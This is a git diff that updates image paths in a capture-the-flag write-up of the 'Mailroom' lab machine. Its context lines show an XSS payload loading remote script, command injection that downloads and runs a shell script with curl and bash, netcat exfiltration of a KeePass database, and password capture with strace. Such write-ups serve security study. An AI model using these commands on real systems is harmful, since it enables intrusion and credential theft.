@@ -108,33 +108,33 @@ git                     [Status: 200, Size: 13201, Words: 1009, Lines: 268, Dura
 
 Checking out the landing page shows a site for shipping services. Hovering over the tabs reveal that it is built with PHP and the footer discloses a hostname of `mailroom.htb` which I add to my `/etc/hosts` file.
 
-![](../assets/img/2026-05-03-Mailroom/1.png)
+![](/assets/img/2026-05-03-Mailroom/1.png)
 
 ### Discovering Cross-Site Scripting
 The About page shows that the organization is looking to expand their services in the future, so I'll keep an eye out for any common developmental pages or subdomains. 
 
-![](../assets/img/2026-05-03-Mailroom/2.png)
+![](/assets/img/2026-05-03-Mailroom/2.png)
 
 Testing their contact form out for Cross-Site Scripting attacks shows that the page renders HTML components, indicating that it is indeed vulnerable. Following the link to review our message shows an inquiry status awaiting manual review, which could be key in some kind of client-side attack here.
 
-![](../assets/img/2026-05-03-Mailroom/3.png)
+![](/assets/img/2026-05-03-Mailroom/3.png)
 
 ### Gitea Site
 Reviewing my scan results reveals a git subdomain, and after adding it to my hosts file, I head on over. We're met with a Gitea instance, a lightweight, self-hosted platform used to manage Git repositories, source code, and collaborative software development. 
 
-![](../assets/img/2026-05-03-Mailroom/4.png)
+![](/assets/img/2026-05-03-Mailroom/4.png)
 
 The page's footer discloses the version that doesn't seem vulnerable to anything common. However, the Explore tab in the header allows us to look at a staffroom repository under Matthew's account.
 
-![](../assets/img/2026-05-03-Mailroom/5.png)
+![](/assets/img/2026-05-03-Mailroom/5.png)
 
 The _auth.php_ page gives us yet another subdomain for a staff review panel, which is appended to my hosts file too.
 
-![](../assets/img/2026-05-03-Mailroom/6.png)
+![](/assets/img/2026-05-03-Mailroom/6.png)
 
 Checking out that site throws a 403 Forbidden on any page, meaning we won't be able to gain access to anything under this subdomain as it stands.
 
-![](../assets/img/2026-05-03-Mailroom/7.png)
+![](/assets/img/2026-05-03-Mailroom/7.png)
 
 ## Exploitation
 
@@ -165,11 +165,11 @@ My XSS payload will just fetch this JS file from my host and give us the page co
 <script src= "http://10.10.14.243/staff_request.js"></script>
 ```
 
-![](../assets/img/2026-05-03-Mailroom/8.png)
+![](/assets/img/2026-05-03-Mailroom/8.png)
 
 This matches the index page from the Gitea repository, confirming that we are hitting the right place.
 
-![](../assets/img/2026-05-03-Mailroom/9.png)
+![](/assets/img/2026-05-03-Mailroom/9.png)
 
 Reading through the index page's code once more shows a login panel that makes a POST request to _auth.php_.
 
@@ -261,7 +261,7 @@ exfil.send();
 
 We send another inquiry through to contact form pointing to the new JS file and wait for a hit back.
 
-![](../assets/img/2026-05-03-Mailroom/10.png)
+![](/assets/img/2026-05-03-Mailroom/10.png)
 
 After decoding, it responds with an invalid login message which is to be expected.
 
@@ -299,7 +299,7 @@ Repeating this process for each name listed in the About page as well as an Admi
 {"success":false,"message":"Invalid email or password"}
 ```
 
-![](../assets/img/2026-05-03-Mailroom/11.png)
+![](/assets/img/2026-05-03-Mailroom/11.png)
 
 Referring to some of [TryHackMe's course material](https://tryhackme.com/room/nosqlinjectiontutorial) and [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection) helps me with this next step.
 
@@ -340,21 +340,21 @@ for (let i = 0; i < charset.length; i++) {
 
 Sending another XSS payload exfils the password to our Python web server and grants us valid credentials for Tristan.
 
-![](../assets/img/2026-05-03-Mailroom/12.png)
+![](/assets/img/2026-05-03-Mailroom/12.png)
 
 ## Privilege Escalation
 Luckily, these work over SSH and grant us a valid login so we don't have to deal with following page redirects. We can now focus on escalating privileges towards root user, beginning with a pivot to Matthew's account.
 
-![](../assets/img/2026-05-03-Mailroom/13.png)
+![](/assets/img/2026-05-03-Mailroom/13.png)
 
 Listing any special file capabilities, sudo permissions, or binaries with SUID bits set returns nothing of interest.
 
-![](../assets/img/2026-05-03-Mailroom/14.png)
+![](/assets/img/2026-05-03-Mailroom/14.png)
 
 ### Command Injection on Staff Site
 A bit more enumeration on the filesystem shows an email inside of `/var/mail` containing a 2FA token that can be used to authenticate to the staff review panel site.
 
-![](../assets/img/2026-05-03-Mailroom/15.png)
+![](/assets/img/2026-05-03-Mailroom/15.png)
 
 First we must port forward the web server to our machine to get around the 403 Forbidden code, which looks to be blocking external IPs. I will create a new SSH session with the `-D` flag to make a dynamic SOCKS proxy that will allow me to access the site. We will need to append `staff-review-panel.mailroom.htb` to the **127.0.0.1** section of our `/etc/hosts` file as well.
 
@@ -362,15 +362,15 @@ First we must port forward the web server to our machine to get around the 403 F
 └─$ ssh tristan@mailroom.htb -D 1080
 ```
 
-![](../assets/img/2026-05-03-Mailroom/16.png)
+![](/assets/img/2026-05-03-Mailroom/16.png)
 
 Since I already have FoxyProxy installed on my Firefox browser, I'll use it to configure a SOCKS5 proxy on a loopback address and match the port used in the SSH command.
 
-![](../assets/img/2026-05-03-Mailroom/17.png)
+![](/assets/img/2026-05-03-Mailroom/17.png)
 
 Now we can head over to the page using the link found in Tristan's inbox.
 
-![](../assets/img/2026-05-03-Mailroom/18.png)
+![](/assets/img/2026-05-03-Mailroom/18.png)
 
 There is an inspect function that allows us to read the submitted inquiries, and by reading the source code from the Gitea pages, we can see that it is very vulnerable to command injection.
 
@@ -391,7 +391,7 @@ After a bit of research and messing around with it, I found that we could use ba
 `curl 10.10.14.243/shelly.sh -o /tmp/shelly.sh`
 ```
 
-![](../assets/img/2026-05-03-Mailroom/19.png)
+![](/assets/img/2026-05-03-Mailroom/19.png)
 
 ### Creds in Web Container
 After standing up a Netcat listener, all that's left is to execute the shell and get a session as www-data.
@@ -400,24 +400,24 @@ After standing up a Netcat listener, all that's left is to execute the shell and
 `bash /tmp/shelly.sh`
 ```
 
-![](../assets/img/2026-05-03-Mailroom/20.png)
+![](/assets/img/2026-05-03-Mailroom/20.png)
 
 This may seem like a step down since we already have CLI access as Tristan, but the hostname indicates that we are in a container. My earlier enumeration also found a containerd directory that enforces this idea.
 
 Other than a _send.sh_ script in `/var/www/hmtl`, it seems pretty empty, but this is where all of the website's files are stored.
 
-![](../assets/img/2026-05-03-Mailroom/21.png)
+![](/assets/img/2026-05-03-Mailroom/21.png)
 
 Knowing that one of the sites was using Gitea, I figured that one of the directories held credentials a **.git** directory. There was nothing interesting by showing the differences between commits, but I end up finding a password for Matthew under the staffroom's config file.
 
-![](../assets/img/2026-05-03-Mailroom/22.png)
+![](/assets/img/2026-05-03-Mailroom/22.png)
 
 This is reused for the machine as well, allowing us to switch users from our previous SSH session as Tristan. Note that password login for Matthew over SSH is disabled and apart of the password from the URL line is percent-encoded, so we must convert it back to ASCII for a valid login.
 
 ### KeePass Database File
 At this point we can grab the user flag under his home directory and see about grabbing root privileges.
 
-![](../assets/img/2026-05-03-Mailroom/23.png)
+![](/assets/img/2026-05-03-Mailroom/23.png)
 
 The only other thing in this directory is a KeePass database file which looks to contain personal credentials. It's a good bet that Matthew has a root password stored in there since the site lists him as the system administrator.
 
@@ -433,20 +433,20 @@ matthew@mailroom:~$ nc 10.10.14.243 1234 < personal.kdbx
 
 This won't terminate a connection, but after a few seconds we can `CTRL + C` it, leaving us with a valid file.
 
-![](../assets/img/2026-05-03-Mailroom/24.png)
+![](/assets/img/2026-05-03-Mailroom/24.png)
 
-![](../assets/img/2026-05-03-Mailroom/25.png)
+![](/assets/img/2026-05-03-Mailroom/25.png)
 
 This database file is password-protected, but we can use a tool like [keepass2john](https://github.com/ivanmrsulja/keepass2john) in order to convert it into a crackable format and recover it.
 
-![](../assets/img/2026-05-03-Mailroom/26.png)
+![](/assets/img/2026-05-03-Mailroom/26.png)
 
 Sending it over to Hashcat or JohnTheRipper won't crack in a reasonable time, so I head back to the machine. The service itself doesn't appear to be vulnerable and Matthew doesn't have any special privileges despite being a sysadmin.
 
 ### Password via Memory Dump
 I eventually decide to upload [pspy](https://github.com/dominicbreuker/pspy) in order to snoop on background processes, hoping to find a script being executed by root user. The output reveals that a UID matching Matthew's is running perl against the kpcli (KeePass Command-Line tool) binary every minute or so on the machine.
 
-![](../assets/img/2026-05-03-Mailroom/27.png)
+![](/assets/img/2026-05-03-Mailroom/27.png)
 
 We can infer that Matthew is opening up the personal.kdbx file to get manage his credentials, so perhaps we can capture the process and trace what characters are being entered at the prompt.
 
@@ -458,7 +458,7 @@ To do so, I will grab the PID of the currently running kpcli process and run str
 
 Just displaying it as is gets pretty confusing, but we're looking for characters read in like so.
 
-![](../assets/img/2026-05-03-Mailroom/28.png)
+![](/assets/img/2026-05-03-Mailroom/28.png)
 
 With a bit of Bash magic, we can reconstruct the password by looking for strings containing `= 1` at the end, extracting the characters being read in, deleting newline characters, and then replacing the printed newline characters (`\n`) with real ones.
 
@@ -466,11 +466,11 @@ With a bit of Bash magic, we can reconstruct the password by looking for strings
 └─$ cat kpcli.out | grep '= 1$' | cut -d'"' -f2 | tr -d '\n' | sed 's/\\n/\n/g
 ```
 
-![](../assets/img/2026-05-03-Mailroom/29.png)
+![](/assets/img/2026-05-03-Mailroom/29.png)
 
 This gives us the password on the first line, however since strace captures all input, there is a strange `\10` in the middle of it which blocks it from working. I eventually figure out that this is in octal format and represents a backspace.
 
-![](../assets/img/2026-05-03-Mailroom/30.png)
+![](/assets/img/2026-05-03-Mailroom/30.png)
 
 Interpreting this correctly shows that the user deletes the character before `\10` in the password, leaving us with a valid password. For example, a string like `abcdef\10ghi` becomes `abcdeghi`.
 
@@ -482,10 +482,10 @@ Finally, I install Keepass2 on my Kali machine to dump the database, giving us t
 └─$ keepass2 personal.kdbx
 ```
 
-![](../assets/img/2026-05-03-Mailroom/31.png)
+![](/assets/img/2026-05-03-Mailroom/31.png)
 
 Switching users lets us grab the final flag under the root directory, completing this challenge.
 
-![](../assets/img/2026-05-03-Mailroom/32.png)
+![](/assets/img/2026-05-03-Mailroom/32.png)
 
 Overall, this box was pretty difficult for me because even though I could recognize the web vulnerabilities present, I'm still a novice at chaining and exploiting them. That being said, I really enjoyed this box since it seemingly covered almost all parts of web and Linux vulnerabilities. I hope this was helpful to anyone following along or stuck like I was and happy hacking!
